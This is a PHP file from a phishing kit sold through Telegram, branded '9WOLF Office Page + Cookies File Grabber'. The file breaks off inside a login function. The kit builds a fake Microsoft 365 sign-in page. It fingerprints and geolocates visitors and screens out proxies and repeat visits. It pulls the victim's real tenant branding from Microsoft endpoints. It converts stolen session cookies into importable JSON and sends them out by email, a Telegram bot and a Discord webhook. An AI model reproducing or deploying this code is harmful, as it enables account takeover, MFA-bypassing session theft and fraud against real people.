<?php

//error_reporting(E_ALL ^ E_NOTICE);
/*

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

// 9WOLF Randomizer
date_default_timezone_set("America/New_York");
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}



function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function dataVisitor($ip){
     $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/'.$ip.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
    $headers[] = 'Accept-Encoding: gzip, deflate';
    $headers[] = 'Accept-Language: ar,en-US;q=0.9,en;q=0.8,de;q=0.7';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);


    $response = json_decode($result,TRUE);


    $isp = $response['isp'];
    $region = $response['city'];
    $countryCode = $response['country'];
    $date = date("d M, Y");
    $time = date("g:i a");
    $date = trim($date . ", Time : " . $time);
    return $ip."
[🏴‍☠️" .($countryCode)." | ".$region." |  ".$isp."
[📅Date: ".$date."";
}
// Get Ip
function getIp(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }elseif ($remote == "::1") {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/?format=json');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		$result = curl_exec($ch);
		$splitor = explode(':', $result);
		$result = $splitor[1];
		$result = str_replace('"', "", $result);
		$result = str_replace('}', "", $result);
		$ip = $result;

    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip2 = getIP();
if($ip2 == "127.0.0.1") {
    $ip2 = "";
}


function ISP($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/'.$ip.'');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: ar,en-US;q=0.9,en;q=0.8,de;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	$js = json_decode($result,TRUE);
	$isp = $js['isp'];
	return $isp;
}

//9WOLF Browser
$userAgent  = $_SERVER['HTTP_USER_AGENT'];

function WOLF_OS() {
    $userAgent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

$os        =   WOLF_OS();

function WOLF_Browser() {
    $userAgent     =   $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array('/msie/i' =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/UCBrowser/i'  =>  'UCBrowser',
                        '/Opr/i'        =>  'Opera',
                        '/Firebird/i'   =>  'Firebird',
                        '/Camino/i'     =>  'Camino',
                        '/Chimera/i'    => 'Chimera',
                        '/Phoenix/i'    => 'Phoenix',
                        '/icab/i'       => 'iCab',
                        '/Lynx/i'       => 'Lynx',
                        '/Links/i'      => 'Links',
                        '/hotjava/i'    => 'HotJava',
                        '/amaya/i'      => 'Amaya',
                        '/IBrowse/i'    => 'IBrowse',
                        '/iTunes/i'     => 'iTunes',
                        '/Silk/i'       => 'Silk',
                        '/Dillo/i'      => 'Dillo', 
                        '/Maxthon/i'    => 'Maxthon',
                        '/Arora/i'      => 'Arora',
                        '/Galeon/i'     => 'Galeon',
                        '/Iceape/i'     => 'Iceape',
                        '/Iceweasel/i'  => 'Iceweasel',
                        '/Midori/i'     => 'Midori',
                        '/QupZilla/i'   => 'QupZilla',
                        '/Namoroka/i'   => 'Namoroka',
                        '/NetSurf/i'    => 'NetSurf',
                        '/BOLT/i'       => 'BOLT',
                        '/EudoraWeb/i'  => 'EudoraWeb',
                        '/shadowfox/i'  => 'ShadowFox',
                        '/Swiftfox/i'   => 'Swiftfox',
                        '/Uzbl/i'       => 'Uzbl',
                        '/UCBrowser/i'  => 'UCBrowser',
                        '/Kindle/i'     => 'Kindle',
                        '/wOSBrowser/i' => 'wOSBrowser',
                        '/Epiphany/i'   => 'Epiphany', 
                        '/SeaMonkey/i'  => 'SeaMonkey',
                        '/Avant Browser/i' => 'Avant Browser',
                        '/Internet Explorer/i' => 'Internet Explorer',
                        '/Safari/i' => 'Safari',
                        '/Mozilla/i' => 'Mozilla',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $userAgent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}


// Check if ip proxy or not
// Return true => Good
function checkProxy ($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://blackbox.ipinfo.app/lookup/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$result = curl_exec($ch);

	if ($result = "y") {
		return false;
	}else{
		return true;
	}
}
// Country Lock
function countryLock($userData, $countryLock){
	if ($userData == $countryLock) {
		return true;
	}else{
		return false;
	}
}
// Get Data From Ip
function GetData(){
    $url = "http://www.geoplugin.net/json.gp?ip=".getIp();
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp=curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    //return $resp;
    $countrycode = $details['geoplugin_countryCode'];
    $country     = $details['geoplugin_countryName'];
    $currency    = $details['geoplugin_currencyCode'];
    $city        = $details['geoplugin_city'];
    $data = array('Country_code' => $countrycode, 'country' => $country , 'Currency' => $currency,'city' => $city  );
    return $data;
}
// Know Redirect From Where
// Return true => Good
function checkRedirect($redirect){	
	if (isset($_SERVER['HTTP_REFERER'])) {
		if (strpos($_SERVER['HTTP_REFERER'], $redirect) ) {
			return true;
		}else{
			return false;
		}
	}
}

// Check If Email Insert Scam Page Before or not
// Return true => Good
function accessOneTime($userEmail){
	// $userEmail = $_GET['email'];
	$text = file_get_contents("9WOLFGrabber/EmailListGrabber.txt");
	$emailArray = explode("\n", $text);
	if (in_array($userEmail, $emailArray)) {
		return false;
	}else{
		return true;

	}
}
// Return true => Good
function accessOneTimeIP($ip){
	$text = file_get_contents("9WOLFGrabber/DiscoveredIp.txt");
	$ipArray = explode("\n", $text);
	if (in_array($ip, $ipArray)) {
		return false;
	}else{
		return true;
	}
}

// Check Email From My List
// Return true => Good
function CheckEmail($userEmail){
	$text = file_get_contents("9WOLFGrabber/EmailListGrabber.txt");
	$emailArray = explode("\n", $text);
	// var_dump($emailArray);
	if (in_array($userEmail, $emailArray)) {
		return true;
	}else{
		return false;
		
	}
}
// Send Msg To Email With Headers
function send($to,$subject,$message){
	global $Owner;
	global $WOLFServer;
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "From: ".$Owner.".<$WOLFServer>." . "\r\n";
    $headers .= "Content-type:text/plain;charset=UTF-8\r\n";
	mail($to, $subject, $message,$headers);
}
// Random Url redirect
function redirectBot(){
    // include($path."index.php");exit();
  return($path."./site/");exit();
}


function encript($str){
	global $encrypt_html ;
	if ($encrypt_html == "true"){
     	echo "<span style='float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;'>". md5(time().rand(100,999999))." </span>".$str. "<span style='float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;'>". md5(time().rand(100,999999))." </span>". "<!--<span>". md5(time().rand(100,999999))."</span>-->";
	}else{
		echo $str;
	}
}

function bs2EmailGrabber($str){
    $str = str_replace("=?UTF-8?B?", "", $str);
    $str = str_replace("?=", "", $str);
    if (base64_encode(base64_decode($str)) === $str) {
        return base64_decode($str);
    }else{
        return $str;    
    }
}



function badWord($str){
	if (strpos($str,"fuck") !== false or strpos($str,"123") !== false or strpos($str,"321") !== false or strpos($str,"hack") !== false or strpos($str,"spam") !== false or strpos($str,"mother") !== false or strpos($str,"bad") !== false or strpos($str,"hello") !==false	or strpos($str,"test") !== false or strpos($str,"lol") !== false ) {
		return false;
	}else{
		return true;
	}
}

//start


function sendEmailResult($cookie = '')


{

    include '../9WOLFConfi/Guration.php';
    $headers .= "From: ".$Owner."<$WOLFServer>" . "\r\n";
    $message .= "For More Information Contact Me On Telegram @NINEWOLFSTORE_bot \n\n\n";
    $message .= $cookie;
    $isCookie = $cookie != '' ? '[Cookie]' : '';
    $subject = "[9WOLF Office Cookie]".$isCookie;
    mail($yourEmail, $subject, $message,$headers);

}

// function sendTelegramResult($cookie = '')

// {

//     include '../9WOLFConfi/Guration.php';
//     $telegramMsg = $cookie;
//     $9WOLFApi="https://api.telegram.org/bot".$botToken;
//     $sendToTelegramBot=[
//       'chat_id'=> urlencode($chatId),
//       'text'=> urldecode($telegramMsg),
//     ];
//     $ch = curl_init($9WOLFApi . '/sendMessage');
//     curl_setopt($ch, CURLOPT_HEADER, true);
//     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//     curl_setopt($ch, CURLOPT_POST, 1);
//     curl_setopt($ch, CURLOPT_POSTFIELDS, ($sendToTelegramBot));
//     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
//     $answer = curl_exec($ch);
//     curl_close($ch);
//       }
      
function WOLFSendResultAsFileToTelegramBot(){
    include '../9WOLFConfi/Guration.php';
    $WOLFCurl = curl_init();
    $WOLFMsg = '';
    curl_setopt($WOLFCurl, CURLOPT_URL, 'https://api.telegram.org/bot'.$botToken.'/sendDocument?caption='.$WOLFMsg);
    curl_setopt($WOLFCurl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($WOLFCurl, CURLOPT_POST, 1);
    $WOLFPost = array(
        'chat_id' => $chatId,
        'document' => curl_file_create(
            'C0ck3!i5.txt',
            'plain/text',
            'Office Cookies v5 Bypass.txt'
    ));
    curl_setopt($WOLFCurl, CURLOPT_POSTFIELDS, $WOLFPost);
    $WOLFaResult = curl_exec($WOLFCurl);
    curl_close($WOLFCurl);
    unlink('C0ck3!i5.txt');
    // var_dump($9WOLFaResult);

}
function sendDiscordResult($cookie)
{
      
      include '../9WOLFConfi/Guration.php';
      $discordMsg = $cookie;
      $url = $webHookUrl;
      $headers = [ 'Content-Type: application/json; charset=utf-8' ];
      $POST = ['content'=>$discordMsg];
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_HTTPHEADER,$headers);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_POSTFIELDS, ($POST));
      $response   = curl_exec($ch);
      curl_close($ch);

}


function cookieToJSON($cookie, $dom)

{

    $arr = explode(";", $cookie);



    $name = explode("=", trim($arr[0]))[0];

    $value = explode("=", trim($arr[0]))[1];

    $domain = $dom;

    $expirationDate = strtotime('+1 month');

    $path = '/';

    $SameSite = null;



    foreach ($arr as $item) {

        $item = trim($item);

        $item = explode("=", $item);

        if (count($item) == 2) {

            if (stripos($item[0], 'expires') !== false) {

                $expirationDate = strtotime($item[1]);

            }



            if (stripos($item[0], 'path') !== false) {

                $path = $item[1];

            }



            if (stripos($item[0], 'SameSite') !== false && stripos($item[0], 'none') !== false) {

                $SameSite = $item[1];

            }

        }

    }



    $hostOnly = (bool) stripos($cookie, 'hostOnly') !== false ? true : false;

    $httpOnly = (bool) stripos($cookie, 'HttpOnly') !== false ? true : false;

    $secure = (bool) stripos($cookie, 'secure') !== false ? true : false;

    $session = (bool) stripos($cookie, 'session') !== false ? true : false;



    $data = [

        "domain" => $domain,

        "expirationDate" => $expirationDate,

        "hostOnly" => $hostOnly,

        "httpOnly" => $httpOnly,

        "name" => $name,

        "path" => $path,

        "sameSite" => $SameSite,

        "secure" => $secure,

        "session" => $session,

        "storeId" => null,

        "value" => $value

    ];



    return $data;

}



function Mid($param, $kata1, $kata2)

{

    if (strpos($param, $kata1) === FALSE) return FALSE;

    if (strpos($param, $kata2) === FALSE) return FALSE;

    $start = strpos($param, $kata1) + strlen($kata1);

    $end = strpos($param, $kata2, $start);

    $return = substr($param, $start, $end - $start);

    return $return;

}





function getTokenMicrosoft($email)
{
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https%3A%2F%2Fofficeapps.live.com&redirect_uri=msauth%3A%2F%2Fcom.microsoft.office.officehubrow%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&state=YT1odHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vY29tbW9uJnI9aHR0cHM6Ly9vZmZpY2VhcHBzLmxpdmUuY29t&login_hint=dan%40shermanactuary.com&x-client-SKU=Android&x-client-Ver=4.2.4&x-client-OS=28&x-client-DM=google%2BPixel%2B2&client-request-id=b9b2e2ea-2882-4a03-9d8a-a3b8d7e73794&haschrome=1&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-app-name=com.microsoft.office.officehubrow&x-app-ver=16.0.16501.20200');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);


$headers = array();
$headers[] = 'Host: login.microsoftonline.com';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 PKeyAuth/1.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'X-Requested-With: com.microsoft.office.officehubrow';
$headers[] = 'Sec-Fetch-Site: none';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Sec-Fetch-Dest: document';
// $headers[] = 'Accept-Encoding: gzip, deflate';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);


 $WOLFResult = curl_exec($ch);


   $json = Mid($WOLFResult , '$Config=', ';');
    $json = json_decode($json, true);

        $ctx = $json['sCtx'];
        $flowToken = $json['sFT'];
        $hpgrequestid = $json['sessionId'];

    $canary = ($json['canary']);

    curl_close($ch);


    return [
         'ctx' => $ctx,

        'flowToken' => $flowToken,

        'hpgrequestid' => $hpgrequestid,

        'canary' =>  $canary

    ];
}




function checkValidEmail($email)

{

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/getuserrealm.srf?login=" . $email);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);



    $result = curl_exec($ch);

    curl_close($ch);

    $json = json_decode($result, true);

    if ($json['NameSpaceType'] == 'Unknown') {

        return false;

    } else {

        return true;

    }

}



function getDetailEmail($email)

{

    $checking = checkValidEmail($email);



    if ($checking == false) {

        return [

            'status' => 'error',

            'message' => "We couldn't find an account with that username. Try another account."

        ];

    }



    $banner = null;

    $background = null;

    $data = [

        "username" => $email,

        "isOtherIdpSupported" => true,

        "checkPhones" => false,

        "isRemoteNGCSupported" => true,

        "isCookieBannerShown" => false,

        "isFidoSupported" => true,

        "originalRequest" => "rQQIARAAhZK_j9N2AMXj5C69i6A9jqqC7QYGhJTk628SOz6pgxPHjpOz88uO4yxW7Nix4x9fJ7GTkH-ASl3oUIRQVQESQpyEkDoVuiA2brqZvUslCurEVgKdUZen9_Te9j6ZPSKHEzmQAzdSMAeOrxVJolQslvRsARpEtkjpIFsumEQWH1OFbQVJwhjNDzMHP196--rw8lPx-YC-9cz6c3yKHdlRFC6O8_nVapVDluUYZs5Aft4bBWMnmCzh7xh2jmH3krtmkJV7p8kFUSApEi9DApZAoUgQFMi1pK4jQtEVJDVSp-56WAVA5ETvRKmthlM5UqGAi5D1BYV1BShDcep5Q4Zei1M1Ejd9v9UDQNjQm-2-KCidSFX4krgRisK07w851nmT_KZFx5ENPwmaOxvzn-S-hea-FqJFdC91Jyl5jG0tS9nKaDnyqX5YMyY2t-a44XJdXlZnHc0p6zWS5I01QQ0dIVCYPiv561grsBaFb4RR5MwUtsVQUjia203CNizX7Meb5kpl8YGC2640aDZifIFqTeTwcgVpTbpLMO2m7NF6i3LxRqPF27w68gEzoXtNhYyjWIJz-oSqgIXa0avcsjtuwMiVs9OT8awelTu67manVq2qgkGj7tKabMeuYWs6HJC-3kcyK_viqmU7bbqKej0mlkJGsLiSL8z4OcUFzXB7OxALDb8CUbktzasorsOGGYtUoaOX5ZPJaerqF-5dwt9S6a3xUXCWIlFoBs74KJwjy_HMLyGxhPnW51RHvpmjPe98B_tr57u99MHBlcRR4vq3IHW8t5c5SHxKH3awh7tb4l7__ev9n14t6k9_mTz64_F-4mw3XzZKfH3MWu2bVLsbBu0ARO0e3q0MZraC8-vhJAYl2J-FbW7xPTjGb6ex2-n0WfoSz2hiTepJtMjQXQZq4H0a--GrxIv9_2X4zYXLmUzsaB4yRp65OPyP5ZcXEx--vnv-5Md3_z54W_8I0",

        "country" => "ID",

        "forceotclogin" => false,

        "isExternalFederationDisallowed" => false,

        "isRemoteConnectSupported" => false, "federationFlags" => 0, "isSignup" => false, "flowToken" => "AQABAAEAAAD--DLA3VO7QrddgJg7WevrrtYD55-US_847WPSVKszmoL19BW8RKdDiSEJ5LIB5-5b-IB6ijNV0ELreEs8ntgOWqAgTGbM24yesug2UQV7ShDu-uEwl96dRckcVp41PCzBqls2KMWLjiG9X2PvLdQY-s1ibzoy4nL-vaLU2kEXkNPDOL5A7s8eVj501xh3bFclyhIQ0KnRTogOAqMW1V7jwTJrVdvrrjagjxGyPdfwdMzHGlnfB7jJYdbDQi2ebKQLRGbR5K8RIiFUcgdo5lHYZbqICoP8BVLLlfnLFDMl59O2gj-t864RmLTncNf8N46JDHQ0Ve_KJ65TDVubMORlnW6DwLNLh0tpPcuBMIbm0eB93LLe_myUrzzj0wngCaUZCt-FeZNif2R1TI6GL22H7WiNRUTvQaxBPCGO-6rfjr0QeoO0khMSfLQ2PumbxS0H1hNwEhlNgol-FnzBxmSwP7rHlAi_fyWV_y9UNAH_F5jIhvhjrE5tn5rJTIyyoW8Ken1FRjdo3raYAy98ncTXVDRI1bSIm0oU1UW6IGMq0CGfTYDNMI7OvuJ8bsz6aIggAA", "isAccessPassSupported" => true

    ];



    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US");

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));



    $headers = array();

    $headers[] = "Host: login.microsoftonline.com";

    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36";

    $headers[] = "Content-Type: text/plain;charset=UTF-8";

    $headers[] = "Cookie: fpc=Am4z0EJhBX5KuuE5933G-GI; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);

    curl_close($ch);

    $ress = json_decode($result, true);



    if (isset($ress['EstsProperties']['UserTenantBranding'][0]['BannerLogo'])) {

        $banner = $ress['EstsProperties']['UserTenantBranding'][0]['BannerLogo'];

    }

    if (isset($ress['EstsProperties']['UserTenantBranding'][0]['Illustration'])) {

        $background = $ress['EstsProperties']['UserTenantBranding'][0]['Illustration'];

    }

    return [

        'status' => 'success',

        'banner' => $banner,

        'background' => $background,

    ];

}


function loginOffice($email, $password)
{
    $token = getTokenMicrosoft($email);

